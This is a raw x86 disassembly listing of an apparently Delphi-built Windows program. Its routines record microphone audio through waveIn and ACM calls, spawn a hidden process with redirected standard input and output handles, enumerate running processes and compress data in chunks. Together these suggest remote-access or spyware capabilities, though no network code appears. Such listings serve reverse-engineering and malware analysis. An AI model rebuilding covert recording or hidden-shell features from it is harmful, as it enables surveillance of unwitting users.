push esi
lea eax [ ebx + 0x108 ]
push eax
mov eax [ ebx + 0x104 ]
push eax
call acmStreamConvert
push 0x0
mov eax [ ebx + 0x104 ]
push eax
call acmStreamReset
mov eax [ ebx + 0x12c ]
mov [ ebx + 0x100 ] 0x0
pop esi
pop ebx
retn
sub_4664d0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_404620
xor eax eax
mov [ esi + 0x104 ] eax
mov edx 0x800
mov eax esi
call sub_466740
lea eax [ esi + 0x15c ]
mov [ eax ] 0x1
mov [ eax + 0x2 ] 0x1
mov [ eax + 0x4 ] 0x5622
mov [ eax + 0x8 ] 0x5622
mov [ eax + 0xc ] 0x1
mov [ eax + 0xe ] 0x8
mov [ eax + 0x10 ] 0x81
lea eax [ esi + 0x1dd ]
mov [ eax ] 0x1
mov [ eax + 0x2 ] 0x1
mov [ eax + 0x4 ] 0x5622
mov [ eax + 0x8 ] 0x5622
mov [ eax + 0xc ] 0x1
mov [ eax + 0xe ] 0x8
mov [ eax + 0x10 ] 0x81
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_46657c
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_466724
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_4665ac
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x108
mov [ eax ] 0x54
xor edx edx
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0xf0 ]
mov [ eax + 0xc ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0xf8 ]
mov [ eax + 0x10 ] edx
xor edx edx
mov [ eax + 0x14 ] edx
xor edx edx
mov [ eax + 0x18 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0xf4 ]
mov [ eax + 0x1c ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0xfc ]
mov [ eax + 0x20 ] edx
xor edx edx
mov [ eax + 0x24 ] edx
xor edx edx
mov [ eax + 0x28 ] edx
pop ebp
retn
sub_46661c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x100 ] 0x1
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
add eax 0x1dd
push eax
mov eax [ ebp - 0x4 ]
add eax 0x15c
push eax
push 0x0
mov eax [ ebp - 0x4 ]
add eax 0x104
push eax
call acmStreamOpen
push 0x0
mov eax [ ebp - 0x4 ]
add eax 0xfc
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xf8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x104 ]
push eax
call acmStreamSize
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xf8 ]
call sub_402f00
mov edx [ ebp - 0x4 ]
mov [ edx + 0xf0 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xfc ]
call sub_402f00
mov edx [ ebp - 0x4 ]
mov [ edx + 0xf4 ] eax
xor eax eax
push ebp
push sub_4666e5
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
call sub_4665ac
pop ecx
push 0x0
mov eax [ ebp - 0x4 ]
add eax 0x108
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x104 ]
push eax
call acmStreamPrepareHeader
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xec ] 0x1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4667dc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4030fc
mov edx r-xdata
lea eax [ esi + 0x5 ]
call sub_4667d4
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_4667d4
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_466888
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_40857c
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4667dc
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_46693c
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_466874
sub_466964
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_404620
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] 0x0
mov [ esi + 0xc ] 0x2000
xor eax eax
mov [ esi + 0x94 ] eax
push esi
push sub_466bc8
call sub_466888
mov [ esi + 0x98 ] eax
mov [ esi + 0x91 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_4669d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_466ca8
push 0x20
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
call waveInUnprepareHeader
test eax eax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
xor ecx ecx
call sub_408568
push 0x20
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
call waveInPrepareHeader
test eax eax
jne r-xdata
mov eax ebx
call sub_402f00
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_466a71
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov ecx ebx
call sub_4030fc
push ebx
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_402f1c
retn
push 0x20
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
call waveInAddBuffer
test eax eax
jne r-xdata
jmp r-xdata
sub_466afc
push ebx
push esi
push edi
add esp 0xffffff7c
mov esi edx
lea edi [ esp ]
mov ecx 0x20
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
add esp 0x84
pop edi
pop esi
pop ebx
retn
push 0x10004
push 0x0
mov eax [ ebx + 0x98 ]
push eax
lea eax [ esp + 0xc ]
push eax
push 0x0
lea eax [ ebx + 0x94 ]
push eax
call waveInOpen
test eax eax
jne r-xdata
movzx esi [ ebx + 0x91 ]
test esi esi
jle r-xdata
mov eax [ ebx + 0x94 ]
push eax
call waveInStart
test eax eax
jne r-xdata
mov eax ebx
call sub_466c40
dec esi
jne r-xdata
mov esi esp
lea edi [ ebx + 0x10 ]
mov ecx 0x20
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov [ ebx + 0x4 ] 0x1
sub_466b80
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
call sub_404650
mov eax [ esi + 0x98 ]
call sub_46693c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
mov eax esi
call sub_466bdc
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_466bdc
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x4 ] 0x0
mov eax [ ebx + 0x94 ]
push eax
call waveInReset
mov eax [ ebx + 0x94 ]
push eax
call waveInClose
xor eax eax
mov [ ebx + 0x94 ] eax
mov eax [ ebx + 0x8 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_46626c
mov edx eax
mov eax ebx
call sub_466ca8
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_466c40
push ebx
push esi
push edi
mov ebx eax
mov eax 0x20
call sub_402f00
mov edi eax
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4661b8
mov esi edi
mov eax [ ebx + 0xc ]
call sub_402f00
mov [ esi ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
xor eax eax
mov [ esi + 0x14 ] eax
push 0x20
push edi
mov eax [ ebx + 0x94 ]
push eax
call waveInPrepareHeader
test eax eax
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
push 0x20
push edi
mov eax [ ebx + 0x94 ]
push eax
call waveInAddBuffer
test eax eax
sub_466ca8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4662c4
mov edi eax
test edi edi
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
call sub_402f1c
mov eax esi
call sub_402f1c
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_466204
sub_466cdc
push ebx
push esi
push edi
add esp 0xfffffed8
mov edi edx
mov esi eax
xor edx edx
mov eax 0x2
call sub_460d3c
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
add esp 0x128
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0x128
mov edx esp
mov eax ebx
call sub_460d5c
cmp eax 0x1
sbb eax eax
inc eax
cmp al 0x1
jne r-xdata
jmp r-xdata
mov edx esp
mov eax ebx
call sub_460d7c
cmp eax 0x1
sbb eax eax
inc eax
cmp al 0x1
je r-xdata
cmp esi [ esp + 0x8 ]
jne r-xdata
mov eax edi
lea edx [ esp + 0x24 ]
mov ecx 0x104
call sub_4057a0
sub_466d4c
push ebp
mov ebp esp
add esp 0xfffffc7c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax ebx
call sub_40a26c
test al al
jne r-xdata
lea eax [ ebp - 0x119 ]
mov edx edi
call sub_40a928
lea eax [ ebp - 0x21e ]
mov edx ebx
call sub_40a928
lea eax [ ebp - 0x323 ]
mov edx esi
call sub_40a928
xor eax eax
push ebp
push sub_466f3b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x384 ]
xor ecx ecx
mov edx 0xc
call sub_403af4
mov [ ebp - 0x384 ] 0xc
xor eax eax
mov [ ebp - 0x380 ] eax
mov [ ebp - 0x37c ] 0xffffffff
push 0x0
push 0x100
push 0x4
lea eax [ ebp - 0x384 ]
push eax
push 0x3
push 0xc0000000
lea eax [ ebp - 0x21e ]
push eax
call CreateFileA
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
push 0x0
push 0x100
push 0x2
lea eax [ ebp - 0x384 ]
push eax
push 0x3
push 0xc0000000
lea eax [ ebp - 0x323 ]
push eax
call CreateFileA
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0xffffffff
jne r-xdata
mov [ ebp - 0x1 ] 0x0
call sub_404f70
jmp r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x368 ]
xor ecx ecx
mov edx 0x44
call sub_403af4
mov [ ebp - 0x368 ] 0x44
mov [ ebp - 0x33c ] 0x101
mov [ ebp - 0x338 ] 0x0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x32c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x330 ] eax
lea eax [ ebp - 0x378 ]
push eax
lea eax [ ebp - 0x368 ]
push eax
push 0x0
push 0x0
push 0x110
push 0xffffffff
push 0x0
push 0x0
lea eax [ ebp - 0x119 ]
push eax
push 0x0
call CreateProcessA
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
call sub_404f70
jmp r-xdata
mov [ ebp - 0x1 ] 0x0
call sub_404f70
jmp r-xdata
push 0xffffffff
mov eax [ ebp - 0x378 ]
push eax
call WaitForSingleObject
mov eax [ ebp - 0x378 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x374 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
push eax
call CloseHandle
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call CloseHandle
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
mov eax [ ebp - 0x8 ]
push eax
call CloseHandle
sub_466f50
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_466fd9
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edi eax
test edi edi
jle r-xdata
sub eax 0x4
mov eax [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466fe0
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
mov esi 0x1
inc esi
dec edi
jne r-xdata
mov bl 0x1
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + esi - 0x1 ]
call sub_405718
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_405974
jne r-xdata
sub_466fec
push ebp
mov ebp esp
mov ecx 0xd
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_46757f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467586
lea eax [ ebp - 0x68 ]
mov edx 0x1a
call sub_405554
retn
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40ef44
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0x4 ]
call sub_4055c8
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40ef44
mov edx [ ebp - 0x30 ]
lea eax [ ebp - 0x4 ]
call sub_4055c8
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x90 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
lea eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_405a44
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0xc ]
mov edx 0x1
call sub_405a84
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
lea edx [ ebp - 0x50 ]
mov eax [ ebp - 0x10 ]
call sub_409b7c
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_40ef44
mov edx [ ebp - 0x44 ]
lea eax [ ebp - 0xc ]
call sub_4055c8
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x48 ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_40ef44
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0xc ]
call sub_4055c8
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x4c ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_40ef44
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0xc ]
call sub_4055c8
mov edx r-xdata
mov eax [ ebp - 0x10 ]
call sub_466f50
cmp al 0x1
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_466f50
cmp al 0x1
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_405a44
mov edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x10 ]
mov edx 0x1
call sub_405a84
push [ esi ]
push [ ebp - 0x24 ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x18 ]
push r-xdata
push [ ebp - 0xc ]
push r-xdata
push [ ebp - 0x1c ]
push r-xdata
push [ ebp - 0x10 ]
push r-xdata
push [ ebp - 0x14 ]
push r-xdata
push [ ebp - 0x20 ]
push r-xdata
mov eax esi
mov edx 0x11
call sub_4058e0
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x60 ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x10 ]
call sub_40ef44
mov edx [ ebp - 0x60 ]
lea eax [ ebp - 0x10 ]
call sub_4055c8
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x64 ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x10 ]
call sub_40ef44
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x10 ]
call sub_4055c8
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x68 ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x10 ]
call sub_40ef44
mov edx [ ebp - 0x68 ]
lea eax [ ebp - 0x10 ]
call sub_4055c8
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_4055c8
lea eax [ ebp - 0x1c ]
push eax
mov edx [ ebp - 0x14 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_405a44
mov edx [ ebp - 0x14 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x14 ]
mov edx 0x1
call sub_405a84
push [ esi ]
push [ ebp - 0x24 ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x18 ]
push r-xdata
push [ ebp - 0xc ]
push r-xdata
push [ ebp - 0x1c ]
push r-xdata
push [ ebp - 0x14 ]
push r-xdata
push [ ebp - 0x10 ]
push r-xdata
push [ ebp - 0x20 ]
push r-xdata
mov eax esi
mov edx 0x11
call sub_4058e0
jmp r-xdata
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x54 ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40ef44
mov edx [ ebp - 0x54 ]
lea eax [ ebp - 0x14 ]
call sub_4055c8
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x58 ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40ef44
mov edx [ ebp - 0x58 ]
lea eax [ ebp - 0x14 ]
call sub_4055c8
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x5c ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40ef44
mov edx [ ebp - 0x5c ]
lea eax [ ebp - 0x14 ]
call sub_4055c8
lea ecx [ ebp - 0x28 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x28 ]
call sub_409b7c
mov edx [ ebp - 0x34 ]
lea eax [ ebp - 0x28 ]
call sub_4055c8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x28 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x28 ]
call sub_405a44
mov edx [ ebp - 0x28 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x28 ]
mov edx 0x1
call sub_405a84
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x28 ]
call sub_409b7c
mov edx [ ebp - 0x38 ]
lea eax [ ebp - 0x28 ]
call sub_4055c8
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x28 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x28 ]
call sub_405a44
mov edx [ ebp - 0x28 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x28 ]
mov edx 0x1
call sub_405a84
lea edx [ ebp - 0x3c ]
mov eax [ ebp - 0x28 ]
call sub_409b7c
mov edx [ ebp - 0x3c ]
lea eax [ ebp - 0x28 ]
call sub_4055c8
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x28 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x28 ]
call sub_405a44
mov edx [ ebp - 0x28 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x28 ]
mov edx 0x1
call sub_405a84
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x28 ]
call sub_409b7c
mov edx [ ebp - 0x40 ]
lea eax [ ebp - 0x28 ]
call sub_4055c8
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x28 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x28 ]
call sub_405a44
mov edx [ ebp - 0x28 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x28 ]
mov edx 0x1
call sub_405a84
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x28 ]
call sub_409b7c
mov eax [ ebp - 0x20 ]
call sub_409edc
lea edx [ ebp - 0x24 ]
call sub_466cdc
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_466f50
cmp al 0x1
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jne r-xdata
sub_467718
push ebx
push esi
push edi
push eax
mov eax 0x10
add esp 0xfffff004
push eax
dec eax
jne r-xdata
mov eax [ esp + 0x10000 ]
add esp 0xffffffc0
mov ebx ecx
mov edi edx
mov [ esp ] eax
lea esi [ esp + 0xc ]
mov eax esi
xor ecx ecx
mov edx 0x38
call sub_403af4
movzx eax bl
movsx edx [ eax + rw-data ]
mov eax esi
call sub_4676e4
call sub_467714
lea edx [ esp + 0x44 ]
mov ecx 0x8000
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
cmp [ esp + 0x8 ] 0x0
jle r-xdata
lea eax [ esp + 0x8044 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] 0x8000
mov eax esi
mov edx 0x4
call sub_468240
call sub_467714
mov [ esp + 0x4 ] eax
mov ebx 0x8000
sub ebx [ esi + 0x10 ]
lea edx [ esp + 0x8044 ]
mov ecx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ esp + 0x4 ] 0x1
jne r-xdata
lea eax [ esp + 0x44 ]
mov [ esi ] eax
mov eax [ esp + 0x8 ]
mov [ esi + 0x4 ] eax
cmp [ esi + 0x10 ] 0x0
jle r-xdata
lea eax [ esp + 0x8044 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] 0x8000
mov eax esi
xor edx edx
call sub_468240
call sub_467714
mov ebx 0x8000
sub ebx [ esi + 0x10 ]
lea edx [ esp + 0x8044 ]
mov ecx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] 0x0
jle r-xdata
mov eax esi
call sub_468504
call sub_467714
add esp 0x10044
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x44 ]
mov ecx 0x8000
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
cmp [ esp + 0x8 ] 0x0
jg r-xdata
sub_467850
push ebx
push esi
push edi
push eax
mov eax 0x10
add esp 0xfffff004
push eax
dec eax
jne r-xdata
mov eax [ esp + 0x10000 ]
add esp 0xffffffc0
mov edi edx
mov [ esp ] eax
lea esi [ esp + 0xc ]
mov eax esi
xor ecx ecx
mov edx 0x38
call sub_403af4
mov eax esi
call sub_4676fc
call sub_467714
lea edx [ esp + 0x44 ]
mov ecx 0x8000
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
cmp [ esp + 0x8 ] 0x0
jle r-xdata
lea eax [ esp + 0x8044 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] 0x8000
mov eax esi
mov edx 0x4
call sub_469b90
call sub_467714
mov [ esp + 0x4 ] eax
mov ebx 0x8000
sub ebx [ esi + 0x10 ]
lea edx [ esp + 0x8044 ]
mov ecx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ esp + 0x4 ] 0x1
jne r-xdata
lea eax [ esp + 0x44 ]
mov [ esi ] eax
mov eax [ esp + 0x8 ]
mov [ esi + 0x4 ] eax
cmp [ esi + 0x10 ] 0x0
jle r-xdata
